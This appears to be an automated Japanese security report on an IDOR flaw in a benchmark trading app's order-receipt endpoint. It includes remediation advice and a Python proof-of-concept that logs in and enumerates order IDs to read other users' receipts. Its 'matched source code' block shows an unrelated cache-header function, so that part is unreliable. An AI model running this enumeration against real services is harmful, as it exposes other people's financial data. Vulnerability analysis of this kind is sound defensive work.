# Security Analysis: routes.py - HTTP request handlers

## ファイル情報

- **ファイルパス**: `benchmarks/benchmarks/XBEN-001-24/app/website/app/routes.py`
- **検出パターン**: HTTP request handlers

![高信頼度](https://img.shields.io/badge/信頼度-高-red) **信頼度スコア: 90**

## 脆弱性タイプ

- `IDOR`

## PAR Policy Analysis

### Principals (データ源)

- **order_id**: Untrusted
  - Context: URLパスパラメータとしてユーザーから直接入力される整数値
  - Risk Factors: ユーザーが任意の値を指定可能, 連番で予測可能, 他のユーザーのリソースを参照可能
- **session['user_id']**: SemiTrusted
  - Context: サーバーサイドセッションに保存された認証済みユーザーID
  - Risk Factors: 認証のみを保証, 認可には使用されていない

### Actions (セキュリティ制御)

- **session.get('user_id')**: Insufficient
  - Function: ユーザーがログインしているかの認証チェック
  - Weaknesses: 認証のみで認可チェックがない, リソースの所有者検証なし
  - Bypass Vectors: 任意のユーザーとしてログインすれば、他ユーザーのリソースにアクセス可能

### Resources (操作対象)

- **Order.query.get(order_id)**: High
  - Operation: データベース読み取り - 注文レシート情報
  - Protection: 認証チェック（不十分）
- **order.receipt**: High
  - Operation: ユーザーの取引情報（銘柄、数量、価格等）
  - Protection: 

### Policy Violations

#### IDOR-001: ユーザーは自身のリソースにのみアクセスできるべき

- **Path**: order_id (untrusted URL param) -> session check (認証のみ) -> Order.query.get() (認可なし) -> receipt.html (情報漏洩)
- **Severity**: high
- **Confidence**: 0.90

## マッチしたソースコード

```code
def add_header(request):
    request.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    request.headers['Pragma'] = 'no-cache'
    request.headers['Expires'] = '0'
    request.headers['Cache-Control'] = 'public, max-age=0'
    return request
```

## 詳細解析

### 脆弱性の概要

`/order/<int:order_id>/receipt` エンドポイント（95-109行目）において、**IDOR（Insecure Direct Object Reference）脆弱性**が存在します。

### 問題点
1. **認証のみで認可なし**: `session.get('user_id')` でユーザーがログインしているかどうかは確認していますが、リクエストされた `order_id` がそのユーザーに属するかどうかの確認がありません。
2. **直接的なオブジェクト参照**: `Order.query.get(order_id)` でURLパラメータから直接注文を取得しており、所有者の検証を行っていません。
3. **データモデルの関係性未活用**: `Order` モデルには `user_id` フィールドがあり、`User` モデルとの関連が定義されているにもかかわらず、この関係性が認可チェックに使用されていません。

### 攻撃シナリオ
攻撃者がユーザーAとしてログインした後、`/order/1/receipt`、`/order/2/receipt`... と順番にリクエストすることで、他のユーザーの注文レシート情報（日付、銘柄、操作タイプ、数量、価格、レシート内容）を不正に閲覧できます。

## PoC（概念実証コード）

```text
# IDOR脆弱性のPoC（Proof of Concept）
import requests

# ベースURL（実際の環境に合わせて変更）
BASE_URL = "http://localhost:5000"

# セッションを作成
session = requests.Session()

# 1. 攻撃者のアカウントでログイン
# ログインフローを実行
login_response = session.post(
    f"{BASE_URL}/",
    data={"username": "attacker_user"}
)

# パスワード入力
password_response = session.post(
    f"{BASE_URL}/password/attacker_user",
    data={"password": "attacker_password"}
)

# 2. 他のユーザーのorder_idを推測してアクセス
# order_idを1から順番に試行
for order_id in range(1, 100):
    receipt_response = session.get(
        f"{BASE_URL}/order/{order_id}/receipt"
    )
    
    if receipt_response.status_code == 200:
        print(f"[+] order_id={order_id} のレシートを取得成功")
        print(receipt_response.text[:500])  # レシート内容を表示
        print("-" * 50)

# 注意: このPoCは認可された環境でのみ使用してください
```

## 修復ガイダンス

### order_receipt関数

- **Required**: 認可チェックの追加
- **Guidance**: 注文を取得した後、order.user_idがsession['user_id']と一致するかを確認する。例: `order = Order.query.filter_by(id=order_id, user_id=user_id).first()` または取得後に `if order.user_id != user_id: abort(403)`
- **Priority**: high

### データアクセス層

- **Required**: アクセス制御の一元化
- **Guidance**: 現在のユーザーに属するリソースのみを返すユーティリティ関数やデコレータを作成し、すべてのリソースアクセスで使用する
- **Priority**: medium

## 解析ノート

コードを分析した結果、order_receipt関数にIDOR脆弱性を確認。ユーザーはログインしているかどうかのみチェックされるが、リクエストされたorder_idが実際にそのユーザーに属するものかどうかの認可チェックが行われていない。攻撃者は任意のorder_idを指定することで、他のユーザーの注文レシートを閲覧可能。コード内のコメントでも明示的にこの脆弱性が記述されている。

